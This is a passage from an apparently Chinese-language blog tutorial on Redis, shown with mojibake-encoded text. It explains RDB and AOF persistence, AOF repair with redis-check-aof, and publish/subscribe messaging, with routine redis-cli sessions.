è¡¨ç¤ºæ¯æ¬¡å†™å…¥éƒ½æ‰§è¡Œfsyncï¼Œä»¥ä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜</span></span><br><span class="line"><span class="comment"># appendfsync no # è¡¨ç¤ºä¸æ‰§è¡Œfsyncï¼Œç”±æ“ä½œç³»ç»Ÿä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜ï¼Œé€Ÿåº¦æœ€å¿«</span></span><br></pre></td></tr></table></figure>

<h1 id="ä¹ã€redisæŒä¹…åŒ–"><a href="#ä¹ã€redisæŒä¹…åŒ–" class="headerlink" title="ä¹ã€redisæŒä¹…åŒ–"></a>ä¹ã€redisæŒä¹…åŒ–</h1><p>Redis æ˜¯å†…å­˜æ•°æ®åº“ï¼Œå¦‚æœä¸å°†å†…å­˜ä¸­çš„æ•°æ®åº“çŠ¶æ€ä¿å­˜åˆ°ç£ç›˜ï¼Œé‚£ä¹ˆä¸€æ—¦æœåŠ¡å™¨è¿›ç¨‹é€€å‡ºï¼ŒæœåŠ¡å™¨ä¸­çš„æ•°æ®åº“çŠ¶æ€ä¹Ÿä¼šæ¶ˆå¤±ã€‚æ‰€ä»¥ Redis æä¾›äº†æŒä¹…åŒ–åŠŸèƒ½ï¼</p>
<h2 id="1ã€RDB-redis-dbbase"><a href="#1ã€RDB-redis-dbbase" class="headerlink" title="1ã€RDB(redis dbbase)"></a>1ã€RDB(redis dbbase)</h2><blockquote>
<p>ä»€ä¹ˆæ˜¯rdb</p>
</blockquote>
<p>RDBæ˜¯ä¸€ç§å¿«ç…§å­˜å‚¨æŒä¹…åŒ–æ–¹å¼ï¼Œå…·ä½“å°±æ˜¯å°†RedisæŸä¸€æ—¶åˆ»çš„å†…å­˜æ•°æ®ä¿å­˜åˆ°ç¡¬ç›˜çš„æ–‡ä»¶å½“ä¸­ï¼Œé»˜è®¤ä¿å­˜çš„æ–‡ä»¶åä¸ºdump.rdbï¼Œè€Œåœ¨RedisæœåŠ¡å™¨å¯åŠ¨æ—¶ï¼Œä¼šé‡æ–°åŠ è½½dump.rdbæ–‡ä»¶çš„æ•°æ®åˆ°å†…å­˜å½“ä¸­æ¢å¤æ•°æ®ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/34284700d944fa3b29da668861c41351--9603--image-20240921145925849.png" alt="image-20240921145925849"></p>
<p>åœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å°†å†…å­˜ä¸­çš„æ•°æ®é›†å¿«ç…§å†™å…¥ç£ç›˜ï¼Œä¹Ÿå°±æ˜¯è¡Œè¯è®²çš„Snapshotå¿«ç…§ï¼Œå®ƒæ¢å¤æ—¶æ˜¯å°†å¿«ç…§æ–‡ä»¶ç›´æ¥è¯»åˆ°å†…å­˜é‡Œã€‚</p>
<p>Redisä¼šå•ç‹¬åˆ›å»ºï¼ˆforkï¼‰ä¸€ä¸ªå­è¿›ç¨‹æ¥è¿›è¡ŒæŒä¹…åŒ–ï¼Œä¼šå…ˆå°†æ•°æ®å†™å…¥åˆ°ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ä¸­ï¼Œå¾…æŒä¹…åŒ–è¿‡ç¨‹éƒ½ç»“æŸäº†ï¼Œå†ç”¨è¿™ä¸ªä¸´æ—¶æ–‡ä»¶æ›¿æ¢ä¸Šæ¬¡æŒä¹…åŒ–å¥½çš„æ–‡ä»¶ã€‚æ•´ä¸ªè¿‡ç¨‹ä¸­ï¼Œä¸»è¿›ç¨‹æ˜¯ä¸è¿›è¡Œä»»ä½•IOæ“ä½œçš„ã€‚è¿™å°±ç¡®ä¿äº†æé«˜çš„æ€§èƒ½ã€‚å¦‚æœéœ€è¦è¿›è¡Œå¤§è§„æ¨¡æ•°æ®çš„æ¢å¤ï¼Œä¸”å¯¹äºæ•°æ®æ¢å¤çš„å®Œæ•´æ€§ä¸æ˜¯éå¸¸æ•æ„Ÿï¼Œé‚£RDBæ–¹å¼è¦æ¯”AOFæ–¹å¼æ›´åŠ çš„é«˜æ•ˆã€‚RDBçš„ç¼ºç‚¹æ˜¯æœ€åä¸€æ¬¡æŒä¹…åŒ–åçš„æ•°æ®å¯èƒ½ä¸¢å¤±ã€‚æˆ‘ä»¬é»˜è®¤çš„å°±æ˜¯RDBï¼Œä¸€èˆ¬æƒ…å†µä¸‹ä¸éœ€è¦ä¿®æ”¹è¿™ä¸ªé…ç½®ï¼</p>
<p>æœ‰æ—¶å€™åœ¨ç”Ÿäº§ç¯å¢ƒæˆ‘ä»¬ä¼šå°†è¿™ä¸ªæ–‡ä»¶è¿›è¡Œå¤‡ä»½ï¼</p>
<p>rdbä¿å­˜çš„æ–‡ä»¶æ˜¯dump.rdb éƒ½æ˜¯åœ¨æˆ‘ä»¬çš„é…ç½®æ–‡ä»¶ä¸­å¿«ç…§ä¸­è¿›è¡Œé…ç½®çš„ï¼</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/86df4f368190fdf8395ace68bc36dc3f--e7a8--image-20240921150223612.png" alt="image-20240921150223612"></p>
<p>å¯åŠ¨å¹¶ç™»é™†redis</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-server /usr/local/bin/myconfig/redis.conf</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹dump.rdbæ–‡ä»¶ä¿å­˜çš„è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/usr/local/bin&quot;</span>   <span class="comment"># å¦‚æœåœ¨è¿™ä¸ªç›®å½•ä¸‹å­˜åœ¨ dump.rdb æ–‡ä»¶ï¼Œå¯åŠ¨å°±ä¼šè‡ªåŠ¨æ¢å¤å…¶ä¸­çš„æ•°æ®</span></span><br></pre></td></tr></table></figure>

<p>å»rootç›®å½•å…ˆæŠŠdump.rdbåˆ é™¤äº†</p>
<p>ç„¶åå¦‚ä¸‹æ“ä½œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">(empty array)</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k1 v1</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k2 v2</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k3 v3 </span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k4 v4</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; <span class="built_in">set</span> k5 v5</span><br><span class="line">OK</span><br></pre></td></tr></table></figure>

<p><code>set k5 v5</code>çš„æ—¶å€™å‘ç°ï¼Œrootç›®å½•ä¸‹ç”Ÿæˆäº†ä¸€ä¸ªdump.rdb</p>
<p><img src="https://typora-picture1234.oss-cn-shenzhen.aliyuncs.com/typora/img/image-20230425154907012.png" alt="image-20230425154907012"></p>
<p>ç„¶åæˆ‘ä»¬å…³é—­redisæœåŠ¡ï¼ˆæ–­ç”µå³å¤±ï¼‰</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; shutdown</span><br><span class="line">not connected&gt; <span class="built_in">exit</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†æ¬¡ç™»é™†redisæœåŠ¡ï¼Œç„¶å<code>get k1</code>,å‘ç°ä»ç„¶å¯ä»¥å–åˆ°å€¼</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-server /usr/local/bin/myconfig/redis.conf</span></span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ ~]<span class="comment"># /usr/local/bin/redis-cli -p 6379</span></span><br><span class="line">127.0.0.1:6379&gt; get k1</span><br><span class="line"><span class="string">&quot;v1&quot;</span></span><br></pre></td></tr></table></figure>

<p>éªŒè¯å®Œäº†ï¼ŒæŠŠredis.confé…ç½®çš„saveè¿˜åŸäº†</p>
<blockquote>
<p>è§¦å‘æœºåˆ¶</p>
</blockquote>
<ol>
<li>saveçš„è§„åˆ™æ»¡è¶³çš„æƒ…å†µä¸‹ï¼Œä¼šè‡ªåŠ¨è§¦å‘rdbè§„åˆ™</li>
<li>æ‰§è¡Œ flushall å‘½ä»¤ï¼Œä¹Ÿä¼šè§¦å‘æˆ‘ä»¬çš„rdbè§„åˆ™</li>
<li>é€€å‡ºredisï¼Œä¹Ÿä¼šäº§ç”Ÿ rdb æ–‡ä»¶</li>
</ol>
<p>å¤‡ä»½å°±è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ª dump.rdb</p>
<blockquote>
<p>å¦‚ä½•æ¢å¤rdbæ–‡ä»¶</p>
</blockquote>
<ol>
<li><p>åªéœ€è¦å°†rdbæ–‡ä»¶æ”¾åœ¨æˆ‘ä»¬rediså¯åŠ¨ç›®å½•å°±å¯ä»¥ï¼Œrediså¯åŠ¨çš„æ—¶å€™ä¼šè‡ªåŠ¨æ£€æŸ¥dump.rdb æ¢å¤å…¶ä¸­çš„æ•°æ®ï¼</p>
</li>
<li><p>æŸ¥çœ‹éœ€è¦å­˜åœ¨çš„ä½ç½®</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; config get <span class="built_in">dir</span></span><br><span class="line">1) <span class="string">&quot;dir&quot;</span></span><br><span class="line">2) <span class="string">&quot;/root&quot;</span>  <span class="comment"># å¦‚æœåœ¨è¿™ä¸ªç›®å½•ä¸‹å­˜åœ¨ dump.rdb æ–‡ä»¶ï¼Œå¯åŠ¨å°±ä¼šè‡ªåŠ¨æ¢å¤å…¶ä¸­çš„æ•°æ®</span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>ä¼˜ç¼ºç‚¹</p>
</blockquote>
<p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li>é€‚åˆå¤§è§„æ¨¡çš„æ•°æ®æ¢å¤</li>
<li>å¯¹æ•°æ®çš„å®Œæ•´æ€§è¦ä¸é«˜</li>
</ol>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li>éœ€è¦ä¸€å®šçš„æ—¶é—´é—´éš”è¿›ç¨‹æ“ä½œï¼å¦‚æœredisæ„å¤–å®•æœºäº†ï¼Œè¿™ä¸ªæœ€åä¸€æ¬¡ä¿®æ”¹æ•°æ®å°±æ²¡æœ‰çš„äº†</li>
<li>forkè¿›ç¨‹çš„æ—¶å€™ï¼Œä¼šå ç”¨ä¸€å®šçš„å†…å®¹ç©ºé—´</li>
</ol>
<h2 id="2ã€AOF-append-only-file"><a href="#2ã€AOF-append-only-file" class="headerlink" title="2ã€AOF(append only file)"></a>2ã€AOF(append only file)</h2><p>ä¸RDBå­˜å‚¨æŸä¸ªæ—¶åˆ»çš„å¿«ç…§ä¸åŒï¼ŒAOFæŒä¹…åŒ–æ–¹å¼ä¼šè®°å½•å®¢æˆ·ç«¯å¯¹æœåŠ¡å™¨çš„æ¯ä¸€æ¬¡å†™æ“ä½œå‘½ä»¤ï¼Œå¹¶å°†è¿™äº›å†™æ“ä½œä»¥Redisåè®®è¿½åŠ ä¿å­˜åˆ°ä»¥åç¼€ä¸ºaofæ–‡ä»¶æœ«å°¾ï¼Œåœ¨RedisæœåŠ¡å™¨é‡å¯æ—¶ï¼Œä¼šåŠ è½½å¹¶è¿è¡Œaofæ–‡ä»¶çš„å‘½ä»¤ï¼Œä»¥è¾¾åˆ°æ¢å¤æ•°æ®çš„ç›®çš„ã€‚</p>
<blockquote>
<p>aofä»€ä¹ˆ</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/f1a9fc29e65fc6c28a6a03bfafc5ae37--39b6--image-20240921150618250.png" alt="image-20240921150618250"></p>
<p>ä»¥æ—¥å¿—çš„å½¢å¼æ¥è®°å½•æ¯ä¸ªå†™æ“ä½œï¼Œå°†Redisæ‰§è¡Œè¿‡çš„æ‰€æœ‰æŒ‡ä»¤è®°å½•ä¸‹æ¥ï¼ˆè¯»æ“ä½œä¸è®°å½•ï¼‰ï¼Œåªè®¸è¿½åŠ æ–‡ä»¶ä½†ä¸å¯ä»¥æ”¹å†™æ–‡ä»¶ï¼Œrediså¯åŠ¨ä¹‹åˆä¼šè¯»å–è¯¥æ–‡ä»¶é‡æ–°æ„å»ºæ•°æ®ï¼Œæ¢è¨€ä¹‹ï¼Œredisé‡å¯çš„è¯å°±æ ¹æ®æ—¥å¿—æ–‡ä»¶çš„å†…å®¹å°†å†™æŒ‡ä»¤ä»å‰åˆ°åæ‰§è¡Œä¸€æ¬¡ä»¥å®Œæˆæ•°æ®çš„æ¢å¤å·¥ä½œ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æœ‰ç‚¹ç±»ä¼¼äºmysqlå¯¼å‡ºçš„sqlæ–‡ä»¶</span><br></pre></td></tr></table></figure>

<p>Aofä¿å­˜çš„æ˜¯ appendonly.aof æ–‡ä»¶</p>
<blockquote>
<p>append</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d8874bfb0e7fc795e1cfa6eaf9fbf1f9--23ac--image-20240921150627559.png" alt="image-20240921150627559"></p>
<p>ç„¶åé‡å¯redis,å°±å¯ä»¥ç”Ÿæ•ˆäº†</p>
<p>å¦‚æœè¿™ä¸ª aof æ–‡ä»¶æœ‰é”™ä½ï¼Œè¿™æ—¶å€™ redis æ˜¯å¯åŠ¨ä¸èµ·æ¥çš„å—ï¼Œæˆ‘ä»¬éœ€è¦ä¿®å¤è¿™ä¸ªaofæ–‡ä»¶</p>
<p>redis ç»™æˆ‘ä»¬æä¾›äº†ä¸€ä¸ªå·¥å…· <code>redis-check-aof --fix</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># redis-check-aof --fix /root/appendonlydir/appendonly.aof.1.incr.aof</span></span><br><span class="line">Start checking Old-Style AOF</span><br><span class="line">0x              30: Expected \r\n, got: 3131</span><br><span class="line">AOF analyzed: filename=/root/appendonlydir/appendonly.aof.1.incr.aof, size=68, ok_up_to=23, ok_up_to_line=12, diff=45</span><br><span class="line">This will shrink the AOF /root/appendonlydir/appendonly.aof.1.incr.aof from 68 bytes, with 45 bytes, to 23 bytes</span><br><span class="line">Continue? [y/N]: y</span><br><span class="line">Successfully truncated AOF /root/appendonlydir/appendonly.aof.1.incr.aof</span><br><span class="line">[root@iZwz9efdd2ukk4oauustczZ bin]<span class="comment"># </span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ–‡ä»¶æ­£å¸¸ï¼Œé‡å¯å°±å¯ä»¥æ¢å¤äº†</p>
<blockquote>
<p>é‡å†™è§„åˆ™è¯´æ˜</p>
</blockquote>
<p>aof é»˜è®¤å°±æ˜¯æ–‡ä»¶çš„æ— é™è¿½åŠ ï¼Œæ–‡ä»¶ä¼šè¶Šæ¥è¶Šå¤§</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/ab219ac86957fd3ae82d2b8e8f0cb5d0--81d6--image-20240921150715489.png" alt="image-20240921150715489"></p>
<p>å¦‚æœ aof æ–‡ä»¶å¤§äº 64mï¼Œå¤ªå¤§äº†ï¼ forkä¸€ä¸ªæ–°çš„è¿›ç¨‹æ¥å°†æˆ‘ä»¬çš„æ–‡ä»¶è¿›è¡Œé‡å†™ï¼</p>
<blockquote>
<p>ä¼˜ç‚¹ç¼ºç‚¹</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># appendfsync always # è¡¨ç¤ºæ¯æ¬¡å†™å…¥éƒ½æ‰§è¡Œfsyncï¼Œä»¥ä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜</span></span><br><span class="line">appendfsync everysec <span class="comment"># è¡¨ç¤ºæ¯æ¬¡å†™å…¥éƒ½æ‰§è¡Œfsyncï¼Œä»¥ä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜</span></span><br><span class="line"><span class="comment"># appendfsync no # è¡¨ç¤ºä¸æ‰§è¡Œfsyncï¼Œç”±æ“ä½œç³»ç»Ÿä¿è¯æ•°æ®åŒæ­¥åˆ°ç£ç›˜ï¼Œé€Ÿåº¦æœ€å¿«</span></span><br></pre></td></tr></table></figure>

<p>ä¼˜ç‚¹ï¼š</p>
<ol>
<li>æ¯ä¸€æ¬¡ä¿®æ”¹éƒ½åŒæ­¥ï¼Œæ–‡ä»¶çš„å®Œæ•´æ€§ä¼šæ›´åŠ å¥½</li>
<li>æ¯ç§’åŒæ­¥ä¸€æ¬¡ï¼Œå¯èƒ½ä¼šä¸¢å¤±ä¸€ç§’çš„æ•°æ®</li>
<li>ä»ä¸åŒæ­¥ï¼Œæ•ˆç‡æœ€é«˜çš„</li>
</ol>
<p>ç¼ºç‚¹ï¼š</p>
<ol>
<li>ç›¸å¯¹äºæ•°æ®æ–‡ä»¶æ¥è¯´ï¼Œaofè¿œè¿œå¤§äº rdbï¼Œä¿®å¤çš„é€Ÿåº¦ä¹Ÿæ¯” rdbæ…¢</li>
<li>Aof è¿è¡Œæ•ˆç‡ä¹Ÿè¦æ¯” rdb æ…¢ï¼Œæ‰€ä»¥æˆ‘ä»¬redisé»˜è®¤çš„é…ç½®å°±æ˜¯rdbæŒä¹…åŒ–</li>
</ol>
<h2 id="3ã€æ‹“å±•"><a href="#3ã€æ‹“å±•" class="headerlink" title="3ã€æ‹“å±•"></a>3ã€æ‹“å±•</h2><ol>
<li><p>RDB æŒä¹…åŒ–æ–¹å¼èƒ½å¤Ÿåœ¨æŒ‡å®šçš„æ—¶é—´é—´éš”å†…å¯¹ä½ çš„æ•°æ®è¿›è¡Œå¿«ç…§å­˜å‚¨</p>
</li>
<li><p>AOF æŒä¹…åŒ–æ–¹å¼è®°å½•æ¯æ¬¡å¯¹æœåŠ¡å™¨å†™çš„æ“ä½œï¼Œå½“æœåŠ¡å™¨é‡å¯çš„æ—¶å€™ä¼šé‡æ–°æ‰§è¡Œè¿™äº›å‘½ä»¤æ¥æ¢å¤åŸå§‹çš„æ•°æ®ï¼ŒAOFå‘½ä»¤ä»¥Redis åè®®è¿½åŠ ä¿å­˜æ¯æ¬¡å†™çš„æ“ä½œåˆ°æ–‡ä»¶æœ«å°¾ï¼ŒRedisè¿˜èƒ½å¯¹AOFæ–‡ä»¶è¿›è¡Œåå°é‡å†™ï¼Œä½¿å¾—AOFæ–‡ä»¶çš„ä½“ç§¯ä¸è‡³äºè¿‡å¤§</p>
</li>
<li><p>åªåšç¼“å­˜ï¼Œå¦‚æœä½ åªå¸Œæœ›ä½ çš„æ•°æ®åœ¨æœåŠ¡å™¨è¿è¡Œçš„æ—¶å€™å­˜åœ¨ï¼Œä½ ä¹Ÿå¯ä»¥ä¸ä½¿ç”¨ä»»ä½•æŒä¹…åŒ–</p>
</li>
<li><p>åŒæ—¶å¼€å¯ä¸¤ç§æŒä¹…åŒ–æ–¹å¼</p>
<ul>
<li><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“redisé‡å¯çš„æ—¶å€™ä¼šä¼˜å…ˆè½½å…¥AOFæ–‡ä»¶æ¥æ¢å¤åŸå§‹çš„æ•°æ®ï¼Œå› ä¸ºåœ¨é€šå¸¸æƒ…å†µä¸‹AOFæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦æ¯”RDBæ–‡ä»¶ä¿å­˜çš„æ•°æ®é›†è¦å®Œæ•´</p>
</li>
<li><p>RDB çš„æ•°æ®ä¸å®æ—¶ï¼ŒåŒæ—¶ä½¿ç”¨ä¸¤è€…æ—¶æœåŠ¡å™¨é‡å¯ä¹Ÿåªä¼šæ‰¾AOFæ–‡ä»¶ï¼Œé‚£è¦ä¸è¦åªä½¿ç”¨AOFå‘¢ï¼Ÿä½œè€…</p>
<p>å»ºè®®ä¸è¦ï¼Œå› ä¸ºRDBæ›´é€‚åˆç”¨äºå¤‡ä»½æ•°æ®åº“ï¼ˆAOFåœ¨ä¸æ–­å˜åŒ–ä¸å¥½å¤‡ä»½ï¼‰ï¼Œå¿«é€Ÿé‡å¯ï¼Œè€Œä¸”ä¸ä¼šæœ‰</p>
<p>AOFå¯èƒ½æ½œåœ¨çš„Bugï¼Œç•™ç€ä½œä¸ºä¸€ä¸ªä¸‡ä¸€çš„æ‰‹æ®µ</p>
</li>
</ul>
</li>
<li><p>æ€§èƒ½å»ºè®®</p>
<ul>
<li><p>å› ä¸ºRDBæ–‡ä»¶åªç”¨ä½œåå¤‡ç”¨é€”ï¼Œå»ºè®®åªåœ¨Slaveä¸ŠæŒä¹…åŒ–RDBæ–‡ä»¶ï¼Œè€Œä¸”åªè¦15åˆ†é’Ÿå¤‡ä»½ä¸€æ¬¡å°±å¤Ÿäº†ï¼Œåªä¿ç•™ save 900 1 è¿™æ¡è§„åˆ™</p>
</li>
<li><p>å¦‚æœEnable AOF ï¼Œå¥½å¤„æ˜¯åœ¨æœ€æ¶åŠ£æƒ…å†µä¸‹ä¹Ÿåªä¼šä¸¢å¤±ä¸è¶…è¿‡ä¸¤ç§’æ•°æ®ï¼Œå¯åŠ¨è„šæœ¬è¾ƒç®€å•åªloadè‡ªå·±çš„AOFæ–‡ä»¶å°±å¯ä»¥äº†ï¼Œ</p>
<p>ä»£ä»·ä¸€æ˜¯å¸¦æ¥äº†æŒç»­çš„IOï¼Œ</p>
<p>äºŒæ˜¯AOF rewrite çš„æœ€åå°† rewrite è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ–°æ•°æ®å†™åˆ°æ–°æ–‡ä»¶é€ æˆçš„é˜»å¡å‡ ä¹æ˜¯ä¸å¯é¿å…çš„ã€‚</p>
<p>åªè¦ç¡¬ç›˜è®¸å¯ï¼Œåº”è¯¥å°½é‡å‡å°‘AOF rewriteçš„é¢‘ç‡ï¼ŒAOFé‡å†™çš„åŸºç¡€å¤§å°é»˜è®¤å€¼64Må¤ªå°äº†ï¼Œå¯ä»¥è®¾åˆ°5Gä»¥ä¸Šï¼Œé»˜è®¤è¶…è¿‡åŸå¤§å°100%å¤§å°é‡å†™å¯ä»¥æ”¹åˆ°é€‚å½“çš„æ•°å€¼</p>
</li>
<li><p>å¦‚æœä¸Enable AOF ï¼Œä»…é  Master-Slave Repllcation å®ç°é«˜å¯ç”¨æ€§ä¹Ÿå¯ä»¥ï¼Œèƒ½çœæ‰ä¸€å¤§ç¬”IOï¼Œä¹Ÿå‡å°‘äº†rewriteæ—¶å¸¦æ¥çš„ç³»ç»Ÿæ³¢åŠ¨ã€‚ä»£ä»·æ˜¯å¦‚æœMaster&#x2F;Slave åŒæ—¶å€’æ‰ï¼Œä¼šä¸¢å¤±åå‡ åˆ†é’Ÿçš„æ•°æ®ï¼Œå¯åŠ¨è„šæœ¬ä¹Ÿè¦æ¯”è¾ƒä¸¤ä¸ª Master&#x2F;Slave ä¸­çš„ RDBæ–‡ä»¶ï¼Œè½½å…¥è¾ƒæ–°çš„é‚£ä¸ªï¼Œå¾®åšå°±æ˜¯è¿™ç§æ¶æ„</p>
</li>
</ul>
</li>
</ol>
<h1 id="åã€rediså‘å¸ƒè®¢é˜…"><a href="#åã€rediså‘å¸ƒè®¢é˜…" class="headerlink" title="åã€rediså‘å¸ƒè®¢é˜…"></a>åã€rediså‘å¸ƒè®¢é˜…</h1><p>Redis å‘å¸ƒè®¢é˜…(pub&#x2F;sub)æ˜¯ä¸€ç§æ¶ˆæ¯é€šä¿¡æ¨¡å¼ï¼šå‘é€è€…(pub)å‘é€æ¶ˆæ¯ï¼Œè®¢é˜…è€…(sub)æ¥æ”¶æ¶ˆæ¯ã€‚</p>
<p>Redis å®¢æˆ·ç«¯å¯ä»¥è®¢é˜…ä»»æ„æ•°é‡çš„é¢‘é“ã€‚</p>
<p>è®¢é˜…&#x2F;å‘å¸ƒæ¶ˆæ¯å›¾ï¼š</p>
<p>ç¬¬ä¸€ä¸ªï¼šæ¶ˆæ¯å‘é€è€…ï¼Œ ç¬¬äºŒä¸ªï¼šé¢‘é“ ç¬¬ä¸‰ä¸ªï¼šæ¶ˆæ¯è®¢é˜…è€…ï¼åã€rediså‘å¸ƒè®¢é˜…</p>
<p><img src="C:/Users/ASUS/AppData/Roaming/Typora/typora-user-images/image-20240921150900397.png" alt="image-20240921150900397"></p>
<p>ä¸‹å›¾å±•ç¤ºäº†é¢‘é“ channel1 ï¼Œ ä»¥åŠè®¢é˜…è¿™ä¸ªé¢‘é“çš„ä¸‰ä¸ªå®¢æˆ·ç«¯ â€”â€” client2 ã€ client5 å’Œ client1 ä¹‹é—´çš„å…³ç³»ï¼š</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/f74234fe4dcb0c60799446592142efcd--8ba8--image-20240921150942348.png" alt="image-20240921150942348"></p>
<p>å½“æœ‰æ–°æ¶ˆæ¯é€šè¿‡ PUBLISH å‘½ä»¤å‘é€ç»™é¢‘é“ channel1 æ—¶ï¼Œ è¿™ä¸ªæ¶ˆæ¯å°±ä¼šè¢«å‘é€ç»™è®¢é˜…å®ƒçš„ä¸‰ä¸ªå®¢æˆ·ç«¯ï¼š </p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/3aa664ca7d1444ad30c91597cfe42655--de96--image-20240921150954137.png" alt="image-20240921150954137"></p>
<blockquote>
<p>å‘½ä»¤</p>
</blockquote>
<p>è¿™äº›å‘½ä»¤è¢«å¹¿æ³›ç”¨äºæ„å»ºå³æ—¶é€šä¿¡åº”ç”¨ï¼Œæ¯”å¦‚ç½‘ç»œèŠå¤©å®¤(chatroom)å’Œå®æ—¶å¹¿æ’­ã€å®æ—¶æé†’ç­‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-09-21/d258d7893e58711b6100ebd7fb948241--b706--image-20240921151004132.png" alt="image-20240921151004132"></p>
<blockquote>
<p>æµ‹è¯•</p>
</blockquote>
<ol>
<li><p>è®¢é˜…é¢‘é“</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>(subscribed mode)&gt; subscribe zyy</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;subscribe&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) (integer) <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>å‘å¸ƒæ¶ˆæ¯åˆ°é¢‘é“ï¼ˆæ–°å¼€ä¸€ä¸ªæœåŠ¡éªŒè¯ï¼‰</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>&gt; PUBLISH zyy <span class="title function_">hellp</span></span><br><span class="line"><span class="params">(integer)</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>æŸ¥çœ‹è®¢é˜…è€…çš„å˜åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">6379</span>(subscribed mode)&gt; subscribe zyy</span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;subscribe&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) (integer) <span class="number">1</span></span><br><span class="line"><span class="number">1</span>) <span class="string">&quot;message&quot;</span></span><br><span class="line"><span class="number">2</span>) <span class="string">&quot;zyy&quot;</span></span><br><span class="line"><span class="number">3</span>) <span class="string">&quot;hellp&quot;</span></span><br></pre></td></tr></table></figure></li>
</ol>
<blockquote>
<p>åŸç†</p>
</blockquote>
<p>Redisæ˜¯ä½¿ç”¨Cå®ç°çš„ï¼Œé€šè¿‡åˆ†æ Redis æºç é‡Œçš„ pubsub.c æ–‡ä»¶ï¼Œäº†è§£å‘å¸ƒå’Œè®¢é˜…æœºåˆ¶çš„åº•å±‚å®ç°ï¼Œç±æ­¤åŠ æ·±å¯¹ Redis çš„ç†è§£ã€‚</p>
<p>Redis é€šè¿‡ PUBLISH ã€SUBSCRIBE å’Œ PSUBSCRIBE ç­‰å‘½ä»¤å®ç°å‘å¸ƒå’Œè®¢é˜…åŠŸèƒ½ã€‚</p>
<p>é€šè¿‡ SUBSCRIBE å‘½ä»¤è®¢é˜…æŸé¢‘é“åï¼Œredis-server é‡Œç»´æŠ¤äº†ä¸€ä¸ªå­—å…¸ï¼Œå­—å…¸çš„é”®å°±æ˜¯ä¸€ä¸ªä¸ª é¢‘é“ï¼ï¼Œè€Œå­—å…¸çš„å€¼åˆ™æ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œé“¾è¡¨ä¸­ä¿å­˜äº†æ‰€æœ‰è®¢é˜…è¿™ä¸ª channel çš„å®¢æˆ·ç«¯ã€‚SUBSCRIBE å‘½ä»¤çš„å…³é”®ï¼Œå°±æ˜¯å°†å®¢æˆ·ç«¯æ·»åŠ åˆ°ç»™å®š channel çš„è®¢é˜…é“¾è¡¨ä¸­ã€‚</p>
